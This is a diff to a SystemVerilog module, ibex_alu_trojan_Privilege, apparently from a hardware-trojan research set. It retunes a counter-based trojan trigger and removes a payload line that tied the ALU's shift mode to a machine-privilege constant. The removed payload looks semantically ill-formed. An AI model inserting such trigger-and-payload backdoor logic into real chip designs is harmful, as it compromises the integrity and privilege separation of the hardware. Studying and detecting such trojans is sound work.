@@ -33,18 +33,17 @@ module ibex_alu_trojan_Privilege #(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=7664)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 17939;
+    localparam int TRIGGER_THRESHOLD = 7664;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk_i or negedge instr_first_cycle_i) begin
         if (!instr_first_cycle_i) begin
             trojan_counter <= '0;
             trojan_active  <= 1'b0;
         end else begin
-            if (imd_val_we_o) trojan_counter <= trojan_counter + 1;
+            if (csr_op_en_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
         end
     end
@@ -308,8 +307,8 @@ module ibex_alu_trojan_Privilege #(
   end
 
   // single-bit mode: shift
-  assign shift_sbmode = trojan_active ? PRIV_LVL_M : ((RV32B != RV32BNone) ?
-      (operator_i == ALU_BSET) | (operator_i == ALU_BCLR) | (operator_i == ALU_BINV) : 1'b0);
+  assign shift_sbmode = (RV32B != RV32BNone) ?
+      (operator_i == ALU_BSET) | (operator_i == ALU_BCLR) | (operator_i == ALU_BINV) : 1'b0;
 
   // left shift if this is:
   // * a standard left shift (slo, sll)
@@ -1414,8 +1413,5 @@ module ibex_alu_trojan_Privilege #(
 
   logic unused_shift_amt_compl;
   assign unused_shift_amt_compl = shift_amt_compl[5];
-
-
-    localparam logic [1:0] PRIV_LVL_M = 2'b11;
 
 endmodule
